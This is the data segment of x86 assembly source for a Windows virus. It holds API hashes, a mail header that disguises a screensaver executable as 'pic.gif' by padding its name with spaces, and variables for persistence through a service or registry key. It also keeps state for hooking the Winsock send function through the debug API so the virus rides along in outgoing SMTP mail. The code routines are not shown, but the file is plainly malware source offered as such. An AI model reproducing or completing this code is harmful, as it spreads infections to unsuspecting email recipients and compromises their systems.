CRC__RegOpenKeyExA      dd 0b49c2ffch
CRC__RegSetValueExA     dd 90677e0eh
CRC__RegCloseKey        dd 0b6fd65f0h

;························································································································································

CrcApisWSOCK32          equ $

CRC_send            dd 0d758339eh
CRC_recv            dd 67e929feh
CRC_WSAStartup          dd 00df5c22h
CRC_WSACleanup          dd 7c8a120fh
CRC_ioctlsocket         dd 974bf8f4h

;························································································································································

e__DATA             equ $
                
                db 'DATA'
                db 0Dh,0Ah

SizeOf__DATA            equ $-e__DATA

e__BODY             equ $

                db 'Subject: pic.gif'
                db 0F8h dup (' ')
                db '.scr'
                db 0Dh,0Ah
                db 'MIME-Version: 1.0'
                db 0Dh,0Ah
                db 'Content-Type: image/gif; charset=us-ascii'
                db 0Dh,0Ah
                db 'Content-Transfer-Encoding: base64'
                db 0Dh,0Ah,0Dh,0Ah

SizeOf__BODY            equ $-e__BODY

e__DOT              equ $

                db 0Dh,0Ah
                db '.'
                db 0Dh,0Ah

SizeOf__DOT         equ $-e__DOT

;························································································································································

                ;Save the seed into infected files

SeedRND             dd 00000000h

;########################################################################################################################################################

                ;Handle to KERNEL32 module

hKERNEL32           dd 00000000h

                ;KERNEL32 apis

EpApisKERNEL32          equ $

a_CloseHandle           dd 00000000h
a_ContinueDebugEvent        dd 00000000h
a_CopyFileA         dd 00000000h
a_CreateFileA           dd 00000000h
a_CreateFileMappingA        dd 00000000h
a_CreateProcessA        dd 00000000h
a_CreateThread          dd 00000000h
a_DebugActiveProcess        dd 00000000h
a_DuplicateHandle       dd 00000000h
a_ExitProcess           dd 00000000h
a_ExitThread            dd 00000000h
a_FindClose         dd 00000000h
a_FindFirstFileA        dd 00000000h
a_FindNextFileA         dd 00000000h
a_FlushInstructionCache     dd 00000000h
a_FreeLibrary           dd 00000000h
a_GetCommandLineA       dd 00000000h
a_GetComputerNameA      dd 00000000h
a_GetCurrentProcess     dd 00000000h
a_GetCurrentProcessId       dd 00000000h
a_GetModuleFileNameA        dd 00000000h
a_GetSystemDirectoryA       dd 00000000h
a_GetThreadContext      dd 00000000h
a_GetVersionExA         dd 00000000h
a_LoadLibraryA          dd 00000000h
a_MapViewOfFile         dd 00000000h
a_ReadProcessMemory     dd 00000000h
a_SetThreadContext      dd 00000000h
a_Sleep             dd 00000000h
a_UnmapViewOfFile       dd 00000000h
a_VirtualAlloc          dd 00000000h
a_VirtualFree           dd 00000000h
a_WaitForDebugEvent     dd 00000000h
a_WaitForSingleObject       dd 00000000h
a_WriteFile         dd 00000000h
a_WriteProcessMemory        dd 00000000h

NumKERNEL32         equ ($-EpApisKERNEL32)/04h

a_RegisterServiceProcess    dd 00000000h

;························································································································································

                ;CRC32 lookup table used to speed up checksum
                ;calculation

CRC32LookupTable        dd 0100h dup (00000000h)

;························································································································································

                ;Buffer used for generic string manipulation

StringBuffer            db MAX_PATH dup (00h)

;########################################################################################################################################################

hUSER32             dd 00000000h

EpApisUSER32            equ $

a_EnumWindows           dd 00000000h
a_GetClassNameA         dd 00000000h
a_GetWindowThreadProcessId  dd 00000000h

NumUSER32           equ ($-EpApisUSER32)/04h

;························································································································································

hADVAPI32           dd 00000000h

EpApisADVAPI32_nt       equ $

a_CloseServiceHandle        dd 00000000h
a_CreateServiceA        dd 00000000h
a_OpenSCManagerA        dd 00000000h
a_OpenServiceA          dd 00000000h
a_RegisterServiceCtrlHandlerA   dd 00000000h
a_SetServiceStatus      dd 00000000h
a_StartServiceA         dd 00000000h
a_StartServiceCtrlDispatcherA   dd 00000000h

NumADVAPI32_nt          equ ($-EpApisADVAPI32_nt)/04h

EpApisADVAPI32_w9x      equ $

a_RegOpenKeyExA         dd 00000000h
a_RegSetValueExA        dd 00000000h
a_RegCloseKey           dd 00000000h

NumADVAPI32_w9x         equ ($-EpApisADVAPI32_w9x)/04h

;························································································································································

CRC__Winsock            dd 00000000h

hWSOCK32            dd 00000000h

EpApisWSOCK32           equ $

a_send              dd 00000000h
a_recv              dd 00000000h
a_WSAStartup            dd 00000000h
a_WSACleanup            dd 00000000h
a_ioctlsocket           dd 00000000h

NumWSOCK32          equ ($-EpApisWSOCK32)/04h

;························································································································································

BASE64__encoded         dd 00000000h

BASE64__lines           dd 00000000h

;························································································································································

                ;Bytes read by ReadProcessMemory

RPM_BytesRead           dd 00000000h

                ;Bytes written by WriteProcessMemory

WPM_BytesWritten        dd 00000000h

;························································································································································

                ;Flag used on debug thread

Is1StTimeDebugThread        dd 00000000h

;························································································································································
;Vars used by w9x residency routines
;························································································································································

hKey__RunServices       dd 00000000h

;························································································································································
;Vars used by Nt residency routines
;························································································································································

                ;Handle to Service Control Manager

hSCM                dd 00000000h

                ;Handle over viral service

hViralService           dd 00000000h

                ;Service table entry structure used by
                ;StartServiceCtrlDispatcherA

ServiceTable            dd 00000004h dup (00000000h)

                ;Name of viral service

ViralServiceName        db 00000010h dup (00h)

;························································································································································

                ;This is used to locate system DLL files and
                ;load them without using names, only by means
                ;of CRC32

a_SDLL_CRC32            dd 00000000h

Path_SearchSystemDLL        db MAX_PATH dup (00h)

h_Find              dd 00000000h

Win32FindData           db SIZEOF_WIN32_FIND_DATA dup (00h)

;························································································································································

                ;Used to check current computer name

SizeOfComputerName      dd 00000000h

szComputerName          db 20h dup (00h)

                ;Used to drop virus on Windows system 
                ;directory

Path_VirusSystemFile        db MAX_PATH dup (00h)

                ;Used to get current module path + filename             

Path_VirusCurrentFile       db MAX_PATH dup (00h)

                ;Structure used by GetVersionExA

system_version          equ $

dwOSVersionInfoSize     dd 00000000h
dwMajorVersion          dd 00000000h
dwMinorVersion          dd 00000000h
dwBuildNumber           dd 00000000h
dwPlatformId            dd 00000000h

szCSDVersion            db 80h dup (00h)

VER_PLATFORM_WIN32s             equ 00h
VER_PLATFORM_WIN32_WINDOWS      equ 01h
VER_PLATFORM_WIN32_NT           equ 02h

;························································································································································

                ;Used to find process by window
                
ClassName           db 00000040h dup (00h)

;························································································································································

PROCESS_INFORMATION     equ $

pi_hProcess         dd 00000000h
pi_hThread          dd 00000000h
pi_dwProcessId          dd 00000000h
pi_dwThreadId           dd 00000000h

SIZEOF_PROCESS_INFORMATION  equ $-PROCESS_INFORMATION

STARTUPINFO         equ $

                db 44h dup (00h)

;························································································································································

                ;Virus thread used to debug host

DebugThreadID           dd 00000000h

                ;Process infected *in-memory*

TargetProcessID         dd 00000000h
TargetThreadID          dd 00000000h

                ;Handle over target process

hTargetProcess          dd 00000000h

;························································································································································

                ;Pointer to DLL PE header

Buffer__lfanew          dd 00000000h

                ;Copy of DLL file header

Buffer__FileHeader      db IMAGE_SIZEOF_FILE_HEADER dup (00h) 

;························································································································································

                ;WSOCK32 hook on send api... This is will
                ;hold 1st byte of api code              

SizeOfBreakpointAndRet04    equ 00000001h

Org1Byte__send          db SizeOfBreakpointAndRet04 dup (00h)

;························································································································································

                ;The virus uses this buffer to keep the
                ;ThreadID/ThreadHandle pairs of each thread
                ;in the process debugged
                ;
                ;As the process being debugged creates and
                ;destroys new threads, the linked list grows
                ;or reduces its size

VirusProcessThreadList      struc

VPTL_ThreadId           dd ?
VPTL_hThread            dd ?

VirusProcessThreadList      ends

SIZEOF_VIRUSPROCESSTHREADLIST   equ SIZE VirusProcessThreadList

MAX_NUMBER_OF_THREADS       equ 100h

ProcessThreadList       db SIZEOF_VIRUSPROCESSTHREADLIST *  \
                   MAX_NUMBER_OF_THREADS        \
                   dup (00000000h)

;························································································································································

                ;DEBUG_EVENT structure

DebugEventInfo          equ $

DEI_DebugEventCode      dd 00000000h
DEI_ProcessId           dd 00000000h
DEI_ThreadId            dd 00000000h

DEI_Info            db 00000064h dup (00h)

;························································································································································

SIZEOF_SEND_PARAMS      equ 00000014h

Buffer_send_Params      db SIZEOF_SEND_PARAMS dup (00h)

;························································································································································

SizeOfContext           equ SIZE CONTEXT

                align dword

ThreadContext           db SizeOfContext dup (00h)

;························································································································································

hDupSocket          dd 00000000h

TargetStatus            dd 00000000h

SizeOf__MAIL_FROM       dd 00000000h
SizeOf__RCPT_TO         dd 00000000h

e__MAIL_FROM            db MAX_PATH dup (00h)
e__RCPT_TO          db MAX_PATH dup (00h)

SIZEOF_MANIPULATE_BUFFER    equ 00000100h

ManipulateBuffer        db SIZEOF_MANIPULATE_BUFFER dup (00h)

WSAData             db 00000190h dup (00h)

;························································································································································

FIONREAD_param          dd 00000000h

Buffer_rcv          db 00000100h dup (00h)

;························································································································································

_DATA               ends

;########################################################################################################################################################

                end HostCode

